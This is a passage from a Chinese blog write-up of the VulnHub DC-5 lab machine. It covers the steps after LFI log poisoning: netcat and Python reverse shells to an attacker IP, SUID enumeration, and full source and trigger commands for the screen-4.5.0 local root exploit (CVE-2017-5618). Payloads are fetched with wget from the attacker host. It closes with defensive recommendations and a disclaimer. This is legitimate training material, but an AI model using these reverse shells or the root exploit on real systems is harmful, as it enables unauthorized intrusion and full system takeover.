+<h3 id="4-5-获取反弹-Shell"><a href="#4-5-获取反弹-Shell" class="headerlink" title="4.5 获取反弹 Shell"></a>4.5 获取反弹 Shell</h3><p>为了方便后续操作，我们通过 Python 反弹一个交互式 Shell。在 Kali 攻击机上开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>然后在浏览器或通过 <code>curl</code> 执行反弹 Shell 命令（注意 URL 编码）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log&amp;cmd=nc -e /bin/bash 192.168.10.128 4444&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果没有 <code>-e</code> 选项的 netcat，可以尝试其他方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log&amp;cmd=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.10.128\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Shell 成功反弹后，升级为更稳定的交互式 TTY：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="comment"># 按 Ctrl+Z 将进程挂到后台，然后：</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、提权：screen-4-5-0-SUID（CVE-2017-5618）"><a href="#五、提权：screen-4-5-0-SUID（CVE-2017-5618）" class="headerlink" title="五、提权：screen-4.5.0 SUID（CVE-2017-5618）"></a>五、提权：screen-4.5.0 SUID（CVE-2017-5618）</h2><h3 id="5-1-基础信息收集"><a href="#5-1-基础信息收集" class="headerlink" title="5.1 基础信息收集"></a>5.1 基础信息收集</h3><p>获得 <code>www-data</code> Shell 后，我们需要收集系统信息，寻找提权路径。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 SUID 文件</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户权限</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<p>在 SUID 文件列表中出现了一个引人注目的程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/screen-4.5.0</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-漏洞确认"><a href="#5-2-漏洞确认" class="headerlink" title="5.2 漏洞确认"></a>5.2 漏洞确认</h3><p><code>screen</code> 是一个经典的终端复用器，但版本 <strong>4.5.0</strong> 存在一个已知的本地提权漏洞 <strong>CVE-2017-5618</strong>。</p>
+<p><strong>漏洞原理：</strong> screen 4.5.0 在编译时没有正确启用特权分离模式。当 screen 以 SUID root 身份运行时，攻击者可以通过精心构造的配置文件或调试选项，触发 screen 以 root 权限执行任意操作，从而完成本地提权。</p>
+<p>使用 <code>searchsploit</code> 搜索相关 Exploit：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+
+<p>找到对应的 Exploit 脚本（例如 <code>41154.sh</code>）。</p>
+<h3 id="5-3-查看-Exploit-内容"><a href="#5-3-查看-Exploit-内容" class="headerlink" title="5.3 查看 Exploit 内容"></a>5.3 查看 Exploit 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 41154</span><br><span class="line"><span class="built_in">cat</span> 41154.sh</span><br></pre></td></tr></table></figure>
+
+<p>该 Exploit 的核心原理是：</p>
+<ol>
+<li>编译一个共享库文件（<code>.so</code>），在其中定义 <code>getgid</code> 函数，该函数会调用 <code>setuid(0)</code> 和 <code>setgid(0)</code> 然后执行 <code>/bin/sh</code></li>
+<li>通过设置 <code>LD_PRELOAD</code> 环境变量，使 screen 在运行时优先加载该恶意的共享库</li>
+<li>screen 具有 SUID 权限，加载 <code>.so</code> 后以 root 身份执行 shell</li>
+</ol>
+<p>核心 Payload（libhax.c）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以及 rootshell.c：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-执行提权"><a href="#5-4-执行提权" class="headerlink" title="5.4 执行提权"></a>5.4 执行提权</h3><p>将 Exploit 脚本内容分步在靶机上执行。由于靶机可能没有安装 <code>gcc</code>，我们需要分两步走：</p>
+<p><strong>方案一：在靶机上编译（如果有 gcc）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="comment"># 将 exploit 代码写入文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;...&#x27;</span> &gt; libhax.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;...&#x27;</span> &gt; rootshell.c</span><br><span class="line"></span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 screen-4.5.0 的 SUID 漏洞触发提权</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p><strong>方案二：在攻击机上交叉编译后上传</strong></p>
+<p>如果靶机缺少编译工具，可以在 Kali 上编译好二进制文件，然后通过 Python HTTP Server 传输：</p>
+<p>Kali 上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>靶机上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.10.128/libhax.so</span><br><span class="line">wget http://192.168.10.128/rootshell</span><br><span class="line"><span class="built_in">chmod</span> +x rootshell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行提权</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-5-获取-Flag"><a href="#5-5-获取-Flag" class="headerlink" title="5.5 获取 Flag"></a>5.5 获取 Flag</h3><p>成功获得 root shell 后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>Flag 内容通常形如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">################################</span><br><span class="line">#   Congratulations!          #</span><br><span class="line">#   You have rooted DC-5!     #</span><br><span class="line">#   Flag: [随机字符串]          #</span><br><span class="line">################################</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、攻击链总结"><a href="#六、攻击链总结" class="headerlink" title="六、攻击链总结"></a>六、攻击链总结</h2><table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>技术</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>信息收集</td>
+<td>nmap &#x2F; dirb</td>
+<td>发现 HTTP 80 + Nginx</td>
+</tr>
+<tr>
+<td>漏洞发现</td>
+<td>手动测试</td>
+<td>Contact 表单 LFI</td>
+</tr>
+<tr>
+<td>LFI → RCE</td>
+<td>Nginx 日志投毒</td>
+<td>User-Agent 注入 PHP 代码</td>
+</tr>
+<tr>
+<td>建立立足点</td>
+<td>反弹 Shell</td>
+<td>nc &#x2F; Python Reverse Shell</td>
+</tr>
+<tr>
+<td>本地提权</td>
+<td>CVE-2017-5618</td>
+<td>screen-4.5.0 SUID 漏洞</td>
+</tr>
+<tr>
+<td>达成目标</td>
+<td>读取 Flag</td>
+<td>&#x2F;root&#x2F;flag.txt</td>
+</tr>
+</tbody></table>
+<p><strong>攻击链全貌：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Port Scan → Web 发现 → LFI 漏洞 → Nginx 日志投毒 → RCE → 反弹 Shell</span><br><span class="line">→ SUID 查找 → screen-4.5.0 CVE-2017-5618 → Root → Flag</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、防御建议"><a href="#七、防御建议" class="headerlink" title="七、防御建议"></a>七、防御建议</h2><ol>
+<li><strong>输入验证</strong>：对 <code>contact.php</code> 中的 <code>file</code> 参数进行白名单校验，禁止包含路径遍历字符。</li>
+<li><strong>关闭 allow_url_include</strong>：在 <code>php.ini</code> 中设置 <code>allow_url_include = Off</code>，并严格限制 <code>include</code> 的文件路径。</li>
+<li><strong>日志目录权限</strong>：Nginx 日志文件的权限应设为仅 root 可写，防止 Web 进程写入日志。</li>
+<li><strong>更新软件</strong>：将 <code>screen</code> 升级到修复版本（4.5.1+），或移除不必要的 SUID 位。</li>
+<li><strong>最小权限原则</strong>：检查系统中所有 SUID 二进制文件，移除非必要的 SUID 权限。</li>
+</ol>
+<hr>
+<h2 id="八、参考链接"><a href="#八、参考链接" class="headerlink" title="八、参考链接"></a>八、参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">VulnHub DC-5 官方页面</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5618">CVE-2017-5618 - GNU Screen 4.5.0 Privilege Escalation</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41154">Exploit-DB: GNU Screen 4.5.0 - Local Privilege Escalation</a></li>
+</ul>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p>本文所涉及的技术、工具和方法仅供<strong>安全研究与学习</strong>之用。严禁利用文中内容进行任何违法活动。读者因不当使用本文信息所造成的任何直接或间接后果，均由使用者本人承担，与本文作者无关。在进行渗透测试前，请确保已获得目标系统所有者的书面授权。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/VulnHub-DC3-Joomla-SQL-Injection/" rel="prev" title="VulnHub DC-3 靶机笔记 — Joomla 注入拿后台">
+                  <i class="fa fa-angle-left"></i> VulnHub DC-3 靶机笔记 — Joomla 注入拿后台
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/VulnHub-DC6-writeup/" rel="next" title="VulnHub DC-6靶机实战">
+                  VulnHub DC-6靶机实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
